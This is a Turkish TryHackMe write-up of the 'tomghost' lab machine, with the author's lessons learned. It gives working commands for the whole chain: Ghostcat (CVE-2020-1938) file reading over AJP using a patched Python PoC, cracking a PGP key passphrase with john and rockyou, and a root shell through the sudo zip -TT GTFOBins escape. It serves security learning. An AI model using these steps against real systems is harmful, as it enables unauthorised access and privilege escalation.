# tomghost — TryHackMe (Kolay, Linux)

> Tomcat/AJP → GhostCat (CVE-2020-1938) → SSH → PGP key kırma → kullanıcı geçişi → sudo `zip` → root

**Zorluk:** Kolay
**İşletim Sistemi:** Linux (Ubuntu 16.04)
**Kazanımlar:** AJP keşfi, Ghostcat dosya okuma, PoC uyarlama (Python 2→3), PGP passphrase kırma, GTFOBins sudo istismarı

---

## 1. Keşif (Enumeration)

```bash
nmap -sC -sV -p- $IP
```

| Port | Servis | Sürüm |
|------|--------|-------|
| 22   | SSH    | OpenSSH 7.2p2 |
| 53   | tcpwrapped | — |
| 8009 | AJP13  | Apache Jserv (Protocol v1.3) |
| 8080 | HTTP   | Apache Tomcat 9.0.30 |

Tomcat'in yanında duran **8009 (AJP)** portu asıl sinyal. AJP + zafiyetli bir Tomcat sürümü doğrudan **Ghostcat**'i işaret ediyor.

---

## 2. Foothold — Ghostcat (CVE-2020-1938)

Ghostcat, AJP üzerinden dosya okuma/dahil etme zafiyeti: 8009 portundan Tomcat web uygulamasının içindeki dosyaları okuyabilirsin — `WEB-INF/web.xml` dahil, ki kimlik bilgileri orada bırakılmış.

Public PoC Python 2 için yazılmıştı, Python 3'te hata verdi — uyarladım:

```python
# self.socket.makefile("rb", bufsize=0)   → bufsize kaldırıldı
self.stream = self.socket.makefile("rb")

# "".join([d.data for d in data])         → bytes + decode
print((b"".join([d.data for d in data]).decode('utf-8', errors='ignore')))
```

`web.xml` okununca SSH kimlik bilgisi sızdı:

```
skyfuck:[REDACTED]
```

```bash
ssh skyfuck@$IP
```

**skyfuck** olarak foothold.

---

## 3. Kullanıcı Geçişi — PGP Key Kırma

`skyfuck`'ın ev dizininde birbirini tamamlayan iki dosya vardı:

```
credential.pgp     ← şifrelenmiş bir kimlik bilgisi
tryhackme.asc      ← passphrase korumalı bir PGP özel anahtarı
```

Zincir: anahtarın passphrase'ini kır, import et, kimlik bilgisini çöz.

```bash
# Kali'de
gpg2john tryhackme.asc > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# passphrase: [REDACTED]

gpg --import tryhackme.asc
gpg --decrypt credential.pgp    # kırılan passphrase'i gir
```

Çözülen dosya **merlin**'in kimlik bilgilerini verdi → `su merlin`.

---

## 4. Yetki Yükseltme — sudo `zip` (GTFOBins)

```bash
sudo -l
```

```
(root : root) NOPASSWD: /usr/bin/zip
```

Parolasız root ile çalışan `zip`, bilinen bir [GTFOBins](https://gtfobins.github.io/gtfobins/zip/) yükseltmesidir — `-TT` test bayrağı rastgele komut çalıştırır:

```bash
sudo zip $(mktemp -u) /etc/hosts -T -TT 'sh #'
```

Root shell'e düşüldü:

```bash
cat /root/root.txt
id
# uid=0(root) gid=0(root) groups=0(root)
```

Root alındı. Flag'ler redakte edildi.

---

## Takıldığım Yerler / Dersler

- **"Ne zamana kadar çözer?" yanlış soruydu.** John küçük varsayılan wordlist'i çalıştırdı, bulamadı, incremental brute-force'a düştü — ki o hiç bitmez. Çözüm sabır değil doğru listeydi: `--wordlist=rockyou.txt` bir saniyeden kısa sürede kırdı. *Bir kırma "bitmiyorsa", saatten değil komuttan şüphelen.*
- **SUID listesi boştu — yol `sudo -l`'di.** Önce `find / -perm -4000` çalıştırıp "değerli bir şey yok" dedim, `sudo -l`'i geç hatırladım. İkisi de ilk refleks: privesc'e başlarken ikisini arka arkaya çalıştır.
- **Ghostcat PoC'si Python 2→3 düzeltmesi gerektirdi** — daha önce başka bir makinede çözdüğüm aynı `makefile`/bytes-decode hatalarıydı. Eski bilgi yeni makineye taşındı.
- **Göreli yol + eksik `cat`.** `cat root/root.txt` yanlış dizine baktı; tek başına `/root/root.txt` dosyayı *çalıştırmaya* çalıştı. Flag `cat /root/root.txt` ile okunur — mutlak yol, başında `cat`.

---

## Saldırı Zinciri Özeti

```
nmap → 8009 AJP + 8080 Tomcat 9.0.30 → Ghostcat (CVE-2020-1938)
  → WEB-INF/web.xml oku → skyfuck SSH creds → SSH foothold
  → credential.pgp + tryhackme.asc → gpg2john + john (rockyou)
  → gpg import + decrypt → merlin creds → su merlin
  → sudo -l → zip NOPASSWD → GTFOBins (zip -TT) → root
```
